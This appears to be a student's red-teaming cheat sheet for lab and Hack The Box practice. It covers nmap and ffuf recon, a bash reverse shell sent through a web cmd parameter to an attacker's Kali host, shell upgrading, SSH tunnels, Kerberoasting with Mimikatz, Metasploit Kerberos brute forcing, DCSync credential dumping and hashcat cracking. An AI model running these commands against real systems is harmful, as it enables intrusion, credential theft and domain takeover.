---
title: "Red Teaming"
---

!!! info
    [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) |
    [CyberChef](https://cyberchef.org/) |
    [SecLists](https://github.com/danielmiessler/SecLists) |
    [IPPSEC knowledgebase](https://ippsec.rocks/)

## Learning Resources

- [ITI0216](http://ois2.taltech.ee/uusois/aine/ITI0216) or [ITI0103](http://ois2.taltech.ee/uusois/aine/ITI0103) courses at TalTech which use many RangeForce labs to go over all essential RedTeaming techniques.
- [Hack The Box](https://www.hackthebox.com/)
- [IppSec YouTube Channel](https://www.youtube.com/@ippsec/videos) - HtB walkthroughs and explanations
- [Tuoni GitHub Repository](https://github.com/shell-dot/tuoni) and [Tuoni Documentation](https://docs.shelldot.com/)

## Recon/Scan

- **Nmap**: `sudo nmap -sC -sV -vv -oA nmap/<output name> <IP or range>`

- **Burp Suite**: Intercept outgoing requests, send to Repeater to modify and test. Use raw tab to inspect exact request/response.

- **Ffuf**: Repeat saved Burp request for fuzzing:
  - Example: enumerate valid usernames by filtering error messages  
    `ffuf -request login.req -request-proto http -w rockyou.txt -fr 'is not recognized as a valid user name'`

- **Web Plugin Scans**: Use tools like `wpscan` for WordPress or CMS plugin vulnerabilities.

- **Git Exposure**: If `.git` directory is accessible on the server, use `git-dumper` to retrieve repo contents.

- **Source Code Vulnerability Analysis**: Tools like `Snyk` or `opengrep` can scan for insecure code patterns or dependencies.

- **User capabilities**:
  - Check if user can `sudo`, sometimes will list specific executables if full sudo not possible: `sudo -l`
  - Find suid executables: `find / -perm -4000 -type f -writable 2>/dev/null`
  - Check `/etc/shadow` and `/etc/passwd`: use `unshadow` if both available.

## Reverse shell / Proxies / Port forwards

If commands can be executed via web requests using a la `cmd` param: `curl -G http://<target IP>/shell/path --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/<kali ip>/9001 0>&1"'`

### Upgrading reverse shell

1. Make sure shell is bash: `python3 -c 'import pty;pty.spawn("/bin/bash")'`
2. Send reverse shell to background: `CTRL + Z`
3. Change terminal setting: `stty raw -echo; fg`
4. export TERM=xterm
5. (Optional) change terminal row and width, use `stty rows 75 cols 250`

or

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-256color
reset
```

or without Python:

```bash
cd /dev/shm
script -q /dev/null
bash
# Ctrl + Z
stty raw -echo;fg
```

### Send SSH proxy back home

If direct SSH is not possible but SSH is available inside the reverse shell, you can tunnel it back to your Kali machine using two reverse shells:

- **Reverse Shell 1 (create SOCKS proxy):**
    ```bash
    ssh -N -D 9999 localhost
    ```
- **Reverse Shell 2 (forward proxy back to Kali):**
    ```bash
    ssh -N -R 9999:localhost:9999 kali@<kali ip>
    ```
- Then on Kali use 9999 as proxy (for example with `proxychains`)

## SQL

- `sqlmap`: Automated tool for SQL injection and database takeover.

Quick SQL command cheat sheet

- **Select database:** `USE <database_name>;`
- **List tables:** `SHOW TABLES;`
- **Show table schema:** `DESCRIBE <table_name>;`
- **View table entries:** `SELECT <column1>, <column2> FROM <table_name>;`

## Windows

- [Shellter](https://www.shellterproject.com/homepage/)
- bloodhound https://github.com/SpecterOps/BloodHound GUI to map explore and see interesting relations
- Mimikatz for Kerberos
- Remmina for RDP sessions

- **LM (LanManager):** Old, deprecated, no encryption.
- **NTLM (New Technology LanManager):** Insecure, deprecated. ISO/EITS standards recommend not using it ([EITS documentation](https://eits.ria.ee/et/versioon/2023/eits-poohidokumendid/etalonturbe-kataloog/app-rakendused/app2-kataloogiteenused/app22-active-directory-domain-services/4-lisateave/4-lisateave/42-ruehmapoliitika-turvasaetete-naeidis/)). Vulnerable to Pass-the-Hash attacks.
- Windows authentication over IP defaults to NTLM. Be cautious! Windows AD and Kerberos require using FQDNs.
- User logins save password hashes to the SAM file (`C:\Windows\system32\config\SAM`). This is similar to `/etc/shadow` in Linux, but Windows hashes are not salted. **Common Sense Security tip:** Never log in to workstations or weakly secured hosts with domain admin or other high-privilege accounts.
- In Windows, hiding can be done using services or DLLs.
- Windows reverse shell payloads can translate Linux commands to Windows equivalents.
- UAC (User Account Control) bypass techniques exist.

When authenticating with Kerberos, time differences between your machine and the server can cause errors such as `KRB_AP_ERR_SKEW (37) - Clock skew too great`. For example:

> User found: "alice" with password "changeme", but no ticket received  
> Error: KRB_AP_ERR_SKEW (37) - Clock skew too great.  
> Local time: 2025-07-12 16:33:52 +0300  
> Server time: 2025-07-12 20:33:51 UTC  
> Difference: 25198 seconds

Sync your clock with the server:

 - Stop automatic time sync (if needed):

    ```sh
    sudo systemctl stop systemd-timesyncd
    # sudo systemctl disable systemd-timesyncd
    ```

 - Sync manually using NTP:

    ```sh
    sudo ntpdate <server IP>
    ```

 - Or set the time manually:

    ```sh
    sudo date -s "@$(($(date +%s) + <seconds difference>))"
    ```

Or Edit NTP configuration:

- Update `/etc/ntp.conf` with the correct server.
- Restart NTP service:

    ```sh
    /etc/init.d/ntpd restart
    ```

- Enable NTP on boot:

    ```sh
    chkconfig --levels 2345 ntpd on
    ```

- Force an update:

    ```sh
    ntpdate -u <server IP>
    ```

- Verify NTP is running:

    ```sh
    ntpq -p
    ```

Query SPN service accounts:

- `setspn -Q <service>/<host>` or `setspn -Q */*` for all
- Or:

    ```ps
    $spn = "<service>/<host>"
    $searcher = New-Object System.DirectoryServices.DirectorySearcher
    $searcher.Filter = "(&(objectClass=user)(servicePrincipalName=$spn))"
    $result = $searcher.FindOne()
    if ($result) {
        $result.Properties["name"]
    } else {
        Write-Output "No account found for SPN $spn"
    }
    ```

### Metasploit Kerberos modules

- Start metasploit: `msfconsole`
- Kerberos login: `use auxiliary/scanner/kerberos/kerberos_login`
- Set params:

    ```bash
    set RHOSTS <host>
    set USERNAME <username>
    set PASSWORD <password>
    set DOMAIN <domain>
    set KDC <kdc>
    set VERBOSE true
    run
    set PASS_FILE /path/to/password_list.txt
    unset PASSWORD
    run
    ```

### Mimikatz

- **Request the TGS (Kerberoasting)** with **Mimikatz**:

  ```txt
  privilege::debug
  kerberos::ask /user:<USER> /password:<PASS> /domain:<DOMAIN> \
                /spn:<service>/<host> /target:<SVC ACCOUNT>
  ```
- Export tickets: `kerberos::list /export`

- **Crack the Service‑Account Password**: Feed the extracted `.kirbi` (or converted hash) to Hashcat, John, etc.

- **Ensure Time Sync**. Kerberos requires client and server clocks to match within ~5 minutes so sync your host time with the domain controller.

- **Log In with Cracked Service Account**. Pass‑the‑Hash, Pass‑the‑Ticket, or plain credentials.

- **Check permissions**: `(Get-ADObject -Identity (Get-ADDomain).DistinguishedName -Properties nTSecurityDescriptor).nTSecurityDescriptor.Access | Where-Object {$_.IdentityReference -like '*<SVC ACCOUNT>*'} | Select IdentityReference,ActiveDirectoryRights,ObjectType`

    > Output:
    > IdentityReference        ActiveDirectoryRights ObjectType
    > -----------------        --------------------- ----------
    > CYBER\iis_svc     ReadProperty, GenericExecute 00000000-0000-0000-0000-000000000000
    > CYBER\iis_svc                    ExtendedRight 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
    > CYBER\iis_svc                    ExtendedRight 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2

  - Which may match dsync vulnerability GUIDs (One [link](https://blog.blacklanternsecurity.com/p/detecting-dcsync), other [link](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync))

    > 1131f6aa‑9c07‑11d1‑f79f‑00c04fc2dcd2	Replicating Directory Changes	Enumerate objects in AD
    > 1131f6ad‑9c07‑11d1‑f79f‑00c04fc2dcd2	Replicating Directory Changes All	Enumerate attribute data (password & key material)

- **User Enumeration** Metasploit:

    ```bash
    use auxiliary/gather/kerberos_enumusers
    set RHOSTS <DC IP>
    set DOMAIN <DOMAIN>
    set USERNAME Administrator # Or leave blank to get all
    run
    ```

- **Privilege Escalation via DCSync** once a privileged account is obtained, dump AD secrets:

    ```bash
    privilege::debug
    lsadump::dcsync /domain:<DOMAIN> /user:Administrator
    ```

- **Crack / Re‑use NTLM Hashes**. Example: `hashcat -m 1000 -a 0 admin.hash rockyou.txt` then `--show`.
